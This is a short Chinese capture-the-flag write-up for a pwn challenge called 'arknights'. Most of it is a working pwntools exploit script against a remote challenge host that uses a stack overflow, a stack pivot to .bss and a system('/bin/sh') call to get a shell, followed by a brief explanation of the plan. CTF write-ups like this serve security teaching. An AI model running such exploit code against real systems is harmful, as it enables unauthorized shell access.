---
typora-copy-images-to: ./images
---

## arknights

栈迁移+read读

先贴exp：

```python
from pwn import *
from LibcSearcher import LibcSearcher
from ctypes import *
context(os='linux', arch='i386',log_level = 'debug')
context.terminal = 'wt.exe -d . wsl.exe -d Ubuntu'.split()
host = 'gz.imxbt.cn'
post = 20998
#p = process('./pwn')
p = remote(host,post)
elf = ELF('./pwn')
#libc = ELF('./pwn')
#gdb.attach(p)

pop_rdi = 0x00000000004018e5
leave = 0x0000000000401393
sys = 0x000000000401130
read = 0x0000000004018A8

p.sendline(b' ')
p.sendline(b'4')
p.sendline(b'1')
payload = b'a'*0x40+p64(elf.bss(0x408))+p64(read)
pause()
p.send(payload)
pause()
payload2 = b'/bin/sh\x00'*0x8+p64(0)+p64(pop_rdi)+p64(elf.bss(0x400-0x20))+p64(sys)
pause()
p.send(payload2)
pause()
p.sendline('exec 1>&0')
p.interactive()
```

前面抽卡那里没什么问题，直接跳过

![image-20250409222505750](./images/image-20250409222505750.png)

这里可以看到`read(0,s,0x60)`这里存在栈溢出，溢出了0x20字节，并且执行`system`指令，那么我们的利用思路就很清晰了：

覆写rbp为bss段地址->利用read函数将`/bin/sh`写入`bss`段(这里vmmap看过了，bss段可写)->通过`pop rdi`执行`/bin/sh`

